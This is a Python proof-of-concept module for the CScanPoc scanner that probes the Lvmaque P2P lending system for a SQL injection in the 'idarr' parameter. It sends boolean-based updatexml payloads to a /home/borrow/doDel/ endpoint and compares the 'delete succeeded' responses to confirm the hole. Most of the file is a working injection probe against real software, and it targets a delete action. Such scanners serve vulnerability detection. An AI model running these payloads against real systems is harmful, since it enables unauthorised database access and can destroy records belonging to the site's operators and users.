# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'P2P_0003'  # 平台漏洞编号，留空
    name = '绿麻雀网贷系统 通用注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-08-10'  # 漏洞公布时间
    desc = '''
        P2P通用系统是一个个人对个人的网贷系统。
        绿麻雀是一款专业的P2P借贷系统，并且提供p2p网贷平台的全方位技术支持和网站运营策划，拥有一支高素质，高学历的技术管理团队，都是来自IT前沿，拥有高超的技术和丰富的制作经验。能为客户提供稳定，高效的服务以及解决问题的最佳方案。
        通杀sql注入漏洞，涉及官方多个版本。
        漏洞文件 App\Lib\Action\HCommonAction.class.php 代码中 $_REQUEST['idarr']没有经过任何过滤直接进入sql.
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'P2P通用系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '92b8505b-63c2-4259-9efb-1374bd178daa'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            arg = self.target
            ture_payload = '/home/borrow/doDel/idarr/updatexml(1,if(1=1,1,0x22),1)'
            target = arg + ture_payload
            code1, head, res1, errcode, _ = hh.http(target)
            false_payload = '/home/borrow/doDel/idarr/updatexml(1,if(1=2,1,0x22),1)'
            target = arg + false_payload
            code2, head, res2, errcode, _ = hh.http(target)
            if code1 == 200 and code2 == 200 and "\\u5220\\u9664\\u6210\\u529f" in res1 and '\\u5220\\u9664\\u6210\\u529f' not in res2:
                # security_hole(target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
